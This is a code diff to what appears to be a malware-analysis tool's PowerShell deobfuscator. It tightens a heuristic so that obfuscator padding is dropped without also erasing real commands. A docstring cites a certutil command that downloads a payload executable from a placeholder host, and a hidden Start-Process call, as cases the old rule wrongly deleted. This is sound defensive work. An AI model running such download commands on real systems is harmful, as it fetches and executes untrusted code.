@@ -50,16 +50,38 @@ from refinery.lib.scripts.ps1.model import (
 _PATH_EXTENSIONS = frozenset({'.exe', '.ps1', '.cmd', '.bat', '.com', '.vbs', '.msi'})
 
 
-def _is_unresolvable_command(expr: Expression, shadowed: frozenset[str] = frozenset()) -> bool:
+def _carries_assignment_marker(cmd: Ps1CommandInvocation, name: str) -> bool:
     """
-    Return `True` when `expr` is a command invocation of an unknown bareword whose arguments are all
-    side-effect-free. Such an invocation will throw `CommandNotFoundException` at runtime — no side
-    effect precedes the throw, and if it somehow resolved, the discarded result is harmless. This
-    predicate is intentionally narrow: only bareword string-literal names that do not match any
-    known cmdlet or alias and do not look like a filesystem path.
+    Whether `cmd` carries the syntactic residue of an assignment the obfuscator emitted where a
+    command was expected. Both spellings have to be recognized because the lexer splits them
+    differently: `foo =5` becomes a name and an `=`-prefixed argument, while `0042DsKaho=8602057`
+    stays a single bareword name, the digit-leading form being the one an obfuscator emits most.
+    """
+    if '=' in name:
+        return True
+    for arg in cmd.arguments:
+        value = arg.value if isinstance(arg, Ps1CommandArgument) else arg
+        if isinstance(value, Ps1StringLiteral) and value.value.startswith('='):
+            return True
+    return False
 
-    A name in `shadowed` — one the script defines as a function/filter — resolves to that definition
-    and runs it, so it does not throw and is not harmless; it is treated as resolvable.
+
+def _is_injected_noise_bareword(expr: Expression, shadowed: frozenset[str] = frozenset()) -> bool:
+    """
+    Return `True` when `expr` is a bareword command carrying an assignment marker and no argument
+    that does anything — the shape an obfuscator injects to pad a script, which the passes below
+    delete along with the `try` wrapped around it.
+
+    This is a guess about an artifact, not a proof about the command. An `=` does not establish that
+    the name resolves to nothing, and a native binary invoked this way is still dropped, so the
+    marker is the entire basis for the guess and nothing here may widen past it. The rule this
+    replaced asked instead whether the metadata knew the name, which read absence from a
+    host-collected table as proof of non-existence: every common LOLBin is missing from that table,
+    so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.
+
+    A name in `shadowed` runs a definition the script supplies, so it is never noise. The argument
+    loop is the only bound on the arguments the marker does not speak for — without it,
+    `foo =5 (Start-Process calc)` reads as noise and the call inside it is deleted with the rest.
     """
     if not isinstance(expr, Ps1CommandInvocation):
         return False
@@ -67,6 +89,8 @@ def _is_unresolvable_command(expr: Expression, shadowed: frozenset[str] = frozen
         return False
     name = expr.name.value
     name_lower = name.lower()
+    if not _carries_assignment_marker(expr, name):
+        return False
     if name_lower in KNOWN_CMDLETS or name_lower in shadowed:
         return False
     if any(sep in name for sep in ('\\', '/', ':')):
@@ -84,11 +108,12 @@ def _is_unresolvable_command(expr: Expression, shadowed: frozenset[str] = frozen
 
 def _try_body_is_harmless(body: list[Statement], shadowed: frozenset[str] = frozenset()) -> bool:
     """
-    Return `True` when every statement in a try body is guaranteed to produce no observable side
-    effects whether it succeeds or throws. This covers pure expressions (value discarded) and
-    unresolvable bareword commands (throw `CommandNotFoundException` with no preceding side effect).
-    A bareword the script redefines as a function is not unresolvable, so `shadowed` is threaded to
-    the resolvability check.
+    Return `True` when every statement in a try body is a pure expression whose value is discarded
+    or a bareword `_is_injected_noise_bareword` recognizes as obfuscator padding.
+
+    The second half is a heuristic, so this does not guarantee the body is harmless; it says the body
+    is pure apart from statements we are willing to guess are noise. A bareword the script redefines
+    as a function runs that definition and is never such a guess, so `shadowed` is threaded through.
     """
     for stmt in body:
         if not isinstance(stmt, Ps1ExpressionStatement):
@@ -97,7 +122,7 @@ def _try_body_is_harmless(body: list[Statement], shadowed: frozenset[str] = froz
             continue
         if is_side_effect_free(stmt.expression):
             continue
-        if _is_unresolvable_command(stmt.expression, shadowed):
+        if _is_injected_noise_bareword(stmt.expression, shadowed):
             continue
         return False
     return True
@@ -496,11 +521,15 @@ class Ps1DeadCodeElimination(Transformer):
         Resolve a `try`/`catch`/`finally` whose `try` body cannot produce observable side effects.
         An empty (or absent) `try` block raises nothing, so every `catch` clause is unreachable and
         drops away; the `finally` block always runs, so its statements are hoisted in place of the
-        whole construct. A non-empty `try` body that is "harmless" (all statements are either pure
-        expressions or unresolvable bareword commands that would throw without side effects) combined
-        with all-empty `catch` clauses is likewise a no-op — the entire construct is replaced with
+        whole construct. A non-empty body that `_try_body_is_harmless` accepts, combined with
+        all-empty `catch` clauses, is likewise treated as a no-op — the construct is replaced with
         any pure-constant statements from the try body (preserving integer/boolean literals that may
         be a function's implicit return value) followed by the `finally` body when present.
+
+        Dissolving the construct is sound for a body that really is pure: an empty `catch` only
+        swallows a throw the removed statements can no longer raise. The risk sits entirely in the
+        noise guess `_try_body_is_harmless` inherits — what is dropped is the statement, not the
+        error handling around it.
         """
         try_body = node.try_block.body if node.try_block is not None else []
         if not try_body:
